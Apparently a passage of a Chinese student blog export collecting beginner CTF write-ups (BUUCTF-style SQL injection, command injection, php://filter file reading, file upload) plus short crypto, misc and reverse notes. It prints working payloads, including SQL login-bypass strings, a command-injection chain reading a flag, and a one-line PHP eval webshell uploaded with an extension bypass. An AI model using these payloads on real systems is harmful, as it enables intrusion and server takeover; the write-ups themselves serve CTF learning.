<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>我们传递过去的内容会被解析为$sql = “select “.$post[‘query’].”||flag from Flag”;</p>
<p>因此我们可以在传递值这边做文章，让数据库进行错误的判断</p>
<p>我们可以尝试传入1,1</p>
<p>返回回来的结果</p>
<p><img src="/2022/02/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220203002112267.png" alt="image-20220203002112267"></p>
<p>在数据库中的操作<br>我们可以发现，这里的内容查询不是对【1,1】||【flag】而是对【1】，【1||flag】</p>
<p>这就是数据库对符号的判断不严谨，导致的非预期漏洞</p>
<p>我们就可以将”,”前的内容改为“ * ”, 从而构建PayLoad【 *,1 】</p>
<p>PayLoad2：【 *,1】</p>
<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>这里又出现了新知识。</p>
<p>Linux中的命令连接操作符</p>
<ol>
<li>和号操作符 (<strong>&amp;</strong>) ‘&amp;’的作用是使命令在后台运行。只要在命令后面跟上一个空格和 ‘&amp;’。你可以一口气在后台运行多个命令。</li>
<li>分号操作符 (<strong>;</strong> ) 分号操作符使你可以一口气运行几个命令，命令顺序执行。</li>
<li>与操作符 (<strong>&amp;&amp;</strong>) 如果第一个命令执行成功，与操作符 (&amp;&amp;)才会执行第二个命令，也就是说，第一个命令退出状态是0，后面的才会执行。在UNIX里面，0表示无错误，而所有非0返回值都是各种错误。</li>
<li>或操作符 (<strong>||</strong>) 或操作符 (||)很像编程中的else语句。上面的操作符允许你在第一个命令失败的情况下执行第二个命令，但第一个命令成功则第二个不会执行</li>
<li>非操作符 (<strong>!</strong>) 非操作符 (!)很像except语句。这个命令会执行除了提供的条件外的所有的语句。这个是纯逻辑操作符，注入很少用</li>
<li>管道操作符 (<strong>|</strong>) PIPE在将第一个命令的输出作为第二个命令的输入时很有用。</li>
<li>优先操作符 <strong>()</strong> 指定优先级</li>
<li>连接符 <strong>()</strong> 连接符 ()如它名字所说，被用于连接shell中那些太长而需要分成多行的命令。可以在输入一个“\”之后就回车，然后继续输入命令行，直到输入完成。</li>
</ol>
<p>这里首先要判断该题的类型，题目为Exec，所以这里我们有必要知道什么是<a href="http://c.biancheng.net/view/3091.html#:~:text=exec%20%E6%98%AF%20Shell%20%E5%86%85%E7%BD%AE%E5%91%BD%E4%BB%A4%20%EF%BC%8C%E5%AE%83%E6%9C%89%E4%B8%A4%E7%A7%8D%E7%94%A8%E6%B3%95%EF%BC%8C%E4%B8%80%E7%A7%8D%E6%98%AF%E6%89%A7%E8%A1%8C%20Shell,%E5%91%BD%E4%BB%A4%EF%BC%8C%E4%B8%80%E7%A7%8D%E6%98%AF%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%82%20%E6%9C%AC%E8%8A%82%E5%8F%AA%E8%AE%B2%E8%A7%A3%E5%90%8E%E9%9D%A2%E4%B8%80%E7%A7%8D%EF%BC%8C%E5%89%8D%E9%9D%A2%E4%B8%80%E7%A7%8D%E8%AF%B7%E5%A4%A7%E5%AE%B6%E8%87%AA%E8%A1%8C%E5%AD%A6%E4%B9%A0%E3%80%82%20%E4%BD%BF%E7%94%A8%20exec%20%E5%91%BD%E4%BB%A4%E5%8F%AF%E4%BB%A5%E6%B0%B8%E4%B9%85%E6%80%A7%E5%9C%B0%E9%87%8D%E5%AE%9A%E5%90%91%EF%BC%8C%E5%90%8E%E7%BB%AD%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E6%96%B9%E5%90%91%E4%B9%9F%E8%A2%AB%E7%A1%AE%E5%AE%9A%E4%BA%86%EF%BC%8C%E7%9B%B4%E5%88%B0%E5%86%8D%E6%AC%A1%E9%81%87%E5%88%B0%20exec%20%E5%91%BD%E4%BB%A4%E6%89%8D%E4%BC%9A%E6%94%B9%E5%8F%98%E9%87%8D%E5%AE%9A%E5%90%91%E7%9A%84%E6%96%B9%E5%90%91%EF%BC%9B%E6%8D%A2%E5%8F%A5%E8%AF%9D%E8%AF%B4%EF%BC%8C%E4%B8%80%E6%AC%A1%E9%87%8D%E5%AE%9A%E5%90%91%EF%BC%8C%E6%B0%B8%E4%B9%85%E6%9C%89%E6%95%88%E3%80%82">Exec</a>和<a href="http://c.biancheng.net/view/706.html#:~:text=Shell%20%E6%98%AF%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%AE%83%E8%BF%9E%E6%8E%A5%E4%BA%86%E7%94%A8%E6%88%B7%E5%92%8C%20Linux%20%E5%86%85%E6%A0%B8%EF%BC%8C%E8%AE%A9%E7%94%A8%E6%88%B7%E8%83%BD%E5%A4%9F%E6%9B%B4%E5%8A%A0%E9%AB%98%E6%95%88%E3%80%81%E5%AE%89%E5%85%A8%E3%80%81%E4%BD%8E%E6%88%90%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%20Linux%20%E5%86%85%E6%A0%B8%EF%BC%8C%E8%BF%99%E5%B0%B1%E6%98%AF%20Shell%20%E7%9A%84%E6%9C%AC%E8%B4%A8%E3%80%82,%E7%9A%84%E8%AF%9D%EF%BC%8C%E7%94%A8%E6%88%B7%E5%B0%B1%E6%B2%A1%E5%8A%9E%E6%B3%95%E4%BD%BF%E7%94%A8%20Linux%E3%80%82%20Shell%20%E6%98%AF%E5%A6%82%E4%BD%95%E8%BF%9E%E6%8E%A5%E7%94%A8%E6%88%B7%E5%92%8C%E5%86%85%E6%A0%B8%E7%9A%84%EF%BC%9F%20Shell%20%E8%83%BD%E5%A4%9F%E6%8E%A5%E6%94%B6%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E7%9A%84%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%B9%B6%E5%AF%B9%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86%EF%BC%8C%E5%A4%84%E7%90%86%E5%AE%8C%E6%AF%95%E5%90%8E%E5%86%8D%E5%B0%86%E7%BB%93%E6%9E%9C%E5%8F%8D%E9%A6%88%E7%BB%99%E7%94%A8%E6%88%B7%EF%BC%8C%E6%AF%94%E5%A6%82%E8%BE%93%E5%87%BA%E5%88%B0%E6%98%BE%E7%A4%BA%E5%99%A8%E3%80%81%E5%86%99%E5%85%A5%E5%88%B0%E6%96%87%E4%BB%B6%E7%AD%89%EF%BC%8C%E8%BF%99%E5%B0%B1%E6%98%AF%E5%A4%A7%E9%83%A8%E5%88%86%E8%AF%BB%E8%80%85%E5%AF%B9%20Shell%20%E7%9A%84%E8%AE%A4%E7%9F%A5%E3%80%82">Shell</a>。Exec的中文意思是”命令执行“，所以这里和SQL注入关系不大。</p>
<p>上面我们了解了linux中的命令连接符，所以我们逐级构造<code>1;cd ../;ls</code>1处可以随便输。</p>
<p>当构造为<code>1;cd ../../../;ls</code>时，目录中出现flag</p>
<p><img src="/2022/02/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220204122557483.png" alt="image-20220204122557483"></p>
<p>然后获取flag就可以了<code>1;cd ../../../;ls;cat flag</code></p>
<p><img src="/2022/02/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220204122646306.png" alt="image-20220204122646306"></p>
<h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>查看源码发现./Archive_room.php，进入该文件。</p>
<p>查看源码发现action.php文件，但是打开后变成end.php文件。所以判断结果为action.php出现时间很短，然后立即出现了end.php文件。所以我们这里用Bp拦截，然后发现action.php文件源码中有secr3t.php文件名，所以我们继续访问该文件。然后发现该文件中提示源码在flag.php文件中，所以我们再进入flag.php文件。进入后提示flag就在这里，只是我们看不到，找遍源码也没找到。所以猜测是被过滤了。所以这里要用到php://filter协议，所以我们让文件以base64编码的形式输出，就不会被过滤了</p>
<p>构造<code>?file=php://filter/convert.base64-encode/resource=flag.php</code>，因为要看到输出的base64编码，所以要再secr3t.php界面输出，结果如图</p>
<p><img src="/2022/02/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220204135439694.png" alt="image-20220204135439694"></p>
<p>然后解码得到flag</p>
]]></content>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 2019Havefun</title>
    <url>/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/</url>
    <content><![CDATA[<p>打开题目后啥也没有，按F12查看代码，发现线索</p>
<p><img src="/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/image-20211205161615155.png" alt="image-20211205161615155"></p>
<span id="more"></span>

<p>很明显要用GET的方式让cat=dog</p>
<p><img src="/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/image-20211205161708933.png" alt="image-20211205161708933"></p>
<p>进入后得到flag</p>
<p><img src="/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/image-20211205161730917.png" alt="image-20211205161730917"></p>
]]></content>
      <tags>
        <tag>GET</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 2019 EasySQL</title>
    <url>/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/</url>
    <content><![CDATA[<p>打开题目如下</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203192806308.png" alt="image-20211203192806308"></p>
<p>典型的爆破，提示他是cl4y，则猜测用户名为cl4y，开始爆破</p>
<span id="more"></span>

<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203193005388.png" alt="image-20211203193005388"></p>
<p><strong>攻击类型：</strong></p>
<p><u>单字典（无论几个变量都是一个字典）<u></u></u></p>
<p>1.狙击手（Sniper）：如果选择多个变量，所选字典会先爆破一个变量，再爆破第二个变量（一个一个来），适用于知道账户或密码的情况。</p>
<p>2.破城槌（Battering ram）：无论选择过几个变量，此字典都会同时爆破（多个一起上，且变量值都一样），适用于账户密码相同的情况。</p>
<p><u>多字典（几个变量就用几个字典）<u></u></u></p>
<p>1.音叉（Pitchfork）：变量1与变量2一一对应进行，若两个字典行数不同，小字典测完即结束，适用于知道多个账号和与之匹配的密码。</p>
<p>2.集束炸弹（Cluster bomb）：一对多出，即变量1的每个变量都要和变量2匹配一遍，适用于账号密码都不知道的情况。</p>
<p>此处应选Sniper，并添加字典。</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203194636704.png" alt="image-20211203194636704"></p>
<p>开始爆破</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203195307444.png" alt="image-20211203195307444"></p>
<p>结果不是723就是737，有两个不同的即736和726，尝试该结果</p>
<p>723</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203195538959.png" alt="image-20211203195538959"></p>
<p>737</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203195619481.png" alt="image-20211203195619481"></p>
<p>736</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203195443399.png" alt="image-20211203195443399"></p>
<p>F12后什么也没有</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203195923451.png" alt="image-20211203195923451"></p>
<p>726</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203195506430.png" alt="image-20211203195506430"></p>
<p>最后得出结果：你爆破你码呢？？？？？？？？？？？？？？？？？？？这是SQL，果断关闭Bp。</p>
<p>随便输入账户密码 并在账号前加  ‘  如图</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203201213071.png" alt="image-20211203201213071"></p>
<p>进入后</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203201229961.png" alt="image-20211203201229961"></p>
<p>谷歌翻译</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203201303627.png" alt="image-20211203201303627"></p>
<p>尝试万能密码 <code>admin&#39; or &#39;1&#39;=&#39;1</code></p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203201415048.png" alt="image-20211203201415048"></p>
<p>结果</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203201442402.png" alt="image-20211203201442402"></p>
<p>不慌，用第二种，不去判断密码的正确性。<code>admin&#39; or 1=1 %23</code></p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203201549920.png" alt="image-20211203201549920"></p>
<p>成功</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203201607750.png" alt="image-20211203201607750"></p>
]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 2019Upload</title>
    <url>/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/</url>
    <content><![CDATA[<p>该题为上传木马题</p>
<p>进入题目后，上传一句话木马</p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140512260.png" alt="image-20211202140512260"></p>
<p>出现如下界面，说明木马不能含有”&lt;?”字符</p>
<span id="more"></span>

<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140538654.png" alt="image-20211202140538654"></p>
<p>因为现在不会写一句话木马，则上网搜不含“&lt;?”的木马</p>
<p>得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>新建php文档，将代码输入其中，并抓包，修改格式，上传。</p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155449805.png" alt="image-20211202155449805"></p>
<p>上传失败</p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155757260.png" alt="image-20211202155757260"></p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160253250.png" alt="image-20211202160253250"></p>
<p>绕过后缀的有文件格式有php,php3,php4,php5,phtml，pht，但php，pht被ban了，php345也不行的都不行，则用phtml</p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160420596.png" alt="image-20211202160420596"></p>
<p>上传后</p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160637524.png" alt="image-20211202160637524"></p>
<p>打开蚁剑连接后发生错误，猜测是中文名字的原因，换成英文名，猜测上传后的文件在upload</p>
<p>链接成功</p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161339014.png" alt="image-20211202161339014"></p>
<p>最后在根目录下得到flag</p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161504689.png" alt="image-20211202161504689"></p>
]]></content>
      <tags>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>第一次接触CTF</title>
    <url>/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/</url>
    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-白给-amp-签到"><a href="#1-白给-amp-签到" class="headerlink" title="1.白给&amp;签到"></a>1.白给&amp;签到</h2><p>没什么可说的，直接复制粘贴。</p>
<h2 id="2-Welcome"><a href="#2-Welcome" class="headerlink" title="2.Welcome"></a>2.Welcome</h2><p>F12查看源代码，得到flag</p>
<span id="more"></span>

<h2 id="3-Get"><a href="#3-Get" class="headerlink" title="3.Get"></a>3.Get</h2><p>由代码知，只需令henu=flag即可输出flag，则在网址一栏添加/?henu=flag。</p>
<h2 id="4-Post"><a href="#4-Post" class="headerlink" title="4.Post"></a>4.Post</h2><p>利用hackbar post传参henu=fl@g即可得到flag</p>
<h2 id="5-easyphp-1"><a href="#5-easyphp-1" class="headerlink" title="5. easyphp_1"></a>5. easyphp_1</h2><p>此题涉及md5加密，根据常见md5加密，搜索s214587387a找到相应md5加密“PHP弱性处理0e开头md5哈希字符串缺陷/bug” 令henu=其中任意加密码，如s1885207154a得到flag</p>
<h2 id="6-全是假的"><a href="#6-全是假的" class="headerlink" title="6.全是假的"></a>6.全是假的</h2><p>通过F12找到，则直接进入/hint.php,多次刷新得到flllagggg.php 访问得知需要WebAC浏览器，启用bp修改浏览器并伪造Ip，但最终没有得到flag</p>
<p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/6.png"></p>
<h2 id="7-Autumn"><a href="#7-Autumn" class="headerlink" title="7. Autumn"></a>7. Autumn</h2><p>网站提示要扫一扫，则打开御剑后台扫描工具，扫描后进入相应网站，提示flag不在这，最终没有得到flag</p>
<h2 id="8-easy-Cookie"><a href="#8-easy-Cookie" class="headerlink" title="8. easy_Cookie"></a>8. easy_Cookie</h2><p>通过Google插件查看cookie</p>
<p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/8.png"></p>
<p>得知是一段密文，打开bp解密，先用url解密知%3D为=，改之，接着连用两次Base64解密得到flag</p>
<h2 id="9-艺术就是？"><a href="#9-艺术就是？" class="headerlink" title="9. 艺术就是？"></a>9. 艺术就是？</h2><p>由火影忍者中迪达拉（哈哈哈哈哈哈哈）知道艺术即为爆破，进去网站发现果然是爆破打开bp，又因为密码账户一样，则用battering ram进行攻击得到administrator，输入得到flag</p>
<h2 id="10-webshell"><a href="#10-webshell" class="headerlink" title="10.webshell"></a>10.webshell</h2><p>关键词“一句话”，进入网址，看来需要用一句话木马通过蚁剑进入后台，提交木马txt用bp修改格式，上传成功，但最终没能用蚁剑连接上。</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="1-滴滴滴"><a href="#1-滴滴滴" class="headerlink" title="1.滴滴滴"></a>1.滴滴滴</h2><p>下载附件后，一看就是摩斯密码，根据摩斯密码得到flag</p>
<h2 id="2-每逢佳节"><a href="#2-每逢佳节" class="headerlink" title="2.每逢佳节"></a>2.每逢佳节</h2><p>一看末尾有=，尝试用bp中的base64解码，得到flag</p>
<h2 id="3-Bacon"><a href="#3-Bacon" class="headerlink" title="3.Bacon"></a>3.Bacon</h2><p>关键词“当铺”，“培根”即当铺密码和培根密码，根据当铺密码转换关系将字符转换为数字，进而利用ASCII码转换为字母形式，最后培根解密得到flag</p>
<h2 id="4-古典变奏"><a href="#4-古典变奏" class="headerlink" title="4.古典变奏"></a>4.古典变奏</h2><p>关键词“猪圈”“凯撒”“栅栏”，先用猪圈密码解密，然后用凯撒密码6，栅栏密码8解密得到flag</p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="1-白给-连上就给flag"><a href="#1-白给-连上就给flag" class="headerlink" title="1. [白给] 连上就给flag"></a>1. [白给] 连上就给flag</h2><p>根据提示下载了ubuntu虚拟机并且安装了netcat 但nc 39.103.198.196 10008</p>
<p>然后输入指令ls -l 再输入cat flag.txt得到flag。</p>
<p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/1.png" alt="img"></p>
<h2 id="2-白给-从后门进来"><a href="#2-白给-从后门进来" class="headerlink" title="2. [白给] 从后门进来"></a>2. [白给] 从后门进来</h2><p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/2.png" alt="img"></p>
<p>不知道咋办了。</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="1-easy-re"><a href="#1-easy-re" class="headerlink" title="1. easy_re"></a>1. easy_re</h2><p>根据要求，下载了ida，将exe拖入后得到</p>
<p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/re1.png" alt="img"></p>
<p>尝试F5转换，最终得到flag。</p>
<h2 id="2-keypatch"><a href="#2-keypatch" class="headerlink" title="2.keypatch"></a>2.keypatch</h2><p>按提示下载安装keypatch（虽然我也不知道有啥用），打开程序后发现一直循环，然后将程序拖入到ida，找到关键函数</p>
<p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/re2.png" alt="img"></p>
<p>将这里的50000改为1，然后运行程序，得到flag。</p>
<h2 id="3-re1"><a href="#3-re1" class="headerlink" title="3.re1"></a>3.re1</h2><p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/re3.1.png" alt="img"></p>
<p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/re3.png" alt="img"></p>
<p>哈哈哈哈哈哈，啊这~，就不用我说了吧。</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="1-小兔子"><a href="#1-小兔子" class="headerlink" title="1.小兔子"></a>1.小兔子</h2><p>下载图片后，右键查看属性，得到一串密文，尝试搜索兔子加密，得知有rabbit解密，通过解密得到flag</p>
<h2 id="2-我在城楼观山景"><a href="#2-我在城楼观山景" class="headerlink" title="2.我在城楼观山景"></a>2.我在城楼观山景</h2><p>下载文档后发现是乱码，尝试搜索前几行字符</p>
<p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/misc2.png" alt="img"></p>
<p>得知该为图片转为txt会出现的乱码，将后缀改为jpg打开图片后，发现左下角的falg</p>
<h2 id="3-如来の兽"><a href="#3-如来の兽" class="headerlink" title="3. 如来の兽"></a>3. 如来の兽</h2><p>根据题目可知，该题涉及佛曰和兽音解密，经过两次解密后，发现仍有密文，尝试搜索社会主义核心价值观解密，得知真有此加密方法，解密得到flag</p>
<h2 id="4-PDF"><a href="#4-PDF" class="headerlink" title="4.PDF"></a>4.PDF</h2><p>提示在图片下面，我们便将PDF转为word文档，得到一串极具讽刺意味的话语，尝试复制搜索，得到该为阴阳怪气加密，解密得到flag</p>
<h2 id="5-QRcode"><a href="#5-QRcode" class="headerlink" title="5. QRcode"></a>5. QRcode</h2><p>打开后发现二维码残缺，补全后扫描得到一串密文，尝试搜索密文，得知有brainfuck加密方式，输入密文，解密得到flag</p>
<h2 id="6-Boringboss"><a href="#6-Boringboss" class="headerlink" title="6.Boringboss"></a>6.Boringboss</h2><p>打开后发现这明显是当铺密码，解密后得到对应数字，利用ASCII码转换为对应字母，接着用培根密码解密得到flag</p>
]]></content>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
</search>
